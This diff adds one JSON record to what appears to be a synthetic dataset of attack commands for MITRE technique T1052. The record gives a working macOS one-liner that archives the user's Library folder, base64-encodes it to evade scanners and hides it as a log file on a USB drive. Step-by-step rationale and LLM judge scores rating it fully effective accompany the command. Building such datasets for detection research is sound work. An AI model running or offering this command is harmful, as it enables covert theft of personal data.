@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library\" | base64 | dd of=\"/Volumes/USB/.printerlogs.txt\" bs=4m conv=sync && sync",
+  "explanation": "Packages the user's Library folder, base64-encodes it to appear text-like, and writes it to a log-looking file on a removable drive using dd.",
+  "rationale_steps": [
+    "Archive the Library directory to a single stream.",
+    "Apply base64 to make the payload appear as textual data to simple content scanners.",
+    "Write the encoded stream to the external media via dd.",
+    "Sync to ensure all data is committed to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-be34993e",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with valid BSD tar/base64/dd options, balanced quoting, and proper redirection/conditionals.",
+        "semantic_score": 5,
+        "semantic_justification": "Effectively compresses the user's Library, base64-encodes it, and writes to a hidden log-like file on a USB volume, aligning with physical exfiltration (though conv=sync may add trailing NUL padding).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:15:49.693803Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper piping, balanced quotes, valid flags for tar/base64/dd, and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing the user's Library folder, encoding it to appear as text, and writing it to a hidden file with an innocuous name on a removable volume.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:15:52.207449Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quoting, and valid flag usage for all commands and their arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly packages sensitive user data, base64-encodes it for obfuscation, writes it to a hidden, benign-named file on a removable drive, and ensures write completion, fully aligning with the T1052 technique and the stated intent.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:16:03.924326Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
